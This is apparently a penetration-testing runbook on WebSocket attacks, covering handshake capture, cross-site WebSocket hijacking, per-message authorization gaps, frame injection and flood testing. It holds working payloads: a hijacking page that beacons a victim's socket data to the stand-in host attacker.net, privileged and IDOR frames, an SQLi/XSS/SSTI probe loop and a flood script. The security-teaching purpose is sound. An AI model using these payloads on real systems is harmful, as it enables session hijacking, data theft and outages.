---
title: "WebSocket Attacks"
description: "Exploiting WebSocket handshakes, missing per-message auth and origin checks, injection over frames, and message-flood DoS."
phase: Web
order: 75
tags:
  - websocket
  - csrf
  - injection
  - realtime
tools:
  - burp suite
  - wscat
  - browser devtools
updated: 2026-10-01
---

A WebSocket is an HTTP request upgraded into a persistent, full-duplex channel. That upgrade is where authentication and origin checks are easy to get wrong. This runbook walks the handshake, hunts per-message auth gaps and CSWSH, probes frame payloads for injection, and measures abuse limits — on **in-scope** targets only.

## 1. Capture the handshake

```bash
# Raw upgrade request, then Ctrl-C
curl -i -N -H "Connection: Upgrade" -H "Upgrade: websocket" \
  -H "Origin: https://target.com" -H "Cookie: session=YOUR_TOKEN" \
  -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  https://target.com/ws

wscat -c "wss://target.com/ws" -H "Cookie: session=YOUR_TOKEN"
```

```js
// log every frame to learn the message schema
const ws = new WebSocket("wss://target.com/ws");
ws.onmessage = (e) => console.log("<<", e.data);
ws.onopen = () => ws.send(JSON.stringify({ action: "getProfile" }));
```

## 2. Test Cross-Site WebSocket Hijacking (CSWSH)

If auth relies only on cookies and `Origin` is unchecked, any attacker page opens the socket with the victim's cookies.

```html
<script>
  const ws = new WebSocket("wss://target.com/ws");
  ws.onopen = () => ws.send(JSON.stringify({ action: "getProfile" }));
  ws.onmessage = (e) =>
    navigator.sendBeacon("https://attacker.net/c?d=" + encodeURIComponent(e.data));
</script>
```

```bash
# Swap in a foreign origin to test the Origin check (full handshake in pipeline)
curl -i -N -H "Connection: Upgrade" -H "Upgrade: websocket" \
  -H "Origin: https://attacker.net" \
  -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  https://target.com/ws
```

## 3. Hunt missing per-message authorization

```bash
wscat -c "wss://target.com/ws" -H "Cookie: session=LOW_PRIV_TOKEN"
# send one per line:
#   {"action":"getUser","id":1337}
#   {"action":"admin.deleteUser","id":42}
#   {"action":"subscribe","channel":"admin-events"}
```

Test IDOR by walking IDs, subscribing to forbidden channels, and replaying frames after logout or token expiry.

## 4. Probe frame payloads for injection

```bash
for p in "'" "\"" "1 OR 1=1" "<script>alert(1)</script>" "{{7*7}}" "\${7*7}"; do
  wscat -c "wss://target.com/ws" -H "Cookie: session=YOUR_TOKEN" <<< "$p"
done
```

Look for SQL/NoSQL errors, command execution when frames trigger jobs, stored XSS when frames render unescaped, and SSTI if a message reaches a template.

## 5. Measure abuse and DoS limits

```js
const ws = new WebSocket("wss://target.com/ws");
ws.onopen = () => {
  let n = 0;
  const t = setInterval(() => {
    ws.send(JSON.stringify({ action: "ping", n: n++ }));
    if (n > 200) clearInterval(t);
  }, 10);
};
// also try one oversized frame and deeply nested JSON; stop at first degradation
```

## Full pipeline

```bash
TARGET="https://target.com/ws"; COOKIE="session=YOUR_TOKEN"
KEY="dGhlIHNhbXBsZSBub25jZQ=="

# 1. Handshake + Origin handling
curl -i -N -H "Connection: Upgrade" -H "Upgrade: websocket" \
  -H "Origin: https://target.com" -H "Cookie: $COOKIE" \
  -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: $KEY" "$TARGET"
# 2. Foreign Origin (CSWSH signal)
curl -i -N -H "Connection: Upgrade" -H "Upgrade: websocket" \
  -H "Origin: https://attacker.net" \
  -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: $KEY" "$TARGET"
# 3. Replay privileged/IDOR frames
wscat -c "wss://target.com/ws" -H "Cookie: $COOKIE" <<< '{"action":"getUser","id":1337}'
```

## Ethics & legality

- Only connect to sockets owned by in-scope assets with written authorization.
- Never flood, slow-read, or induce outages — prove limits with the smallest signal.
- Use your own accounts and callback host for CSWSH and exfiltration.
- Log timestamp, origin, and payloads as evidence, and redact secrets.
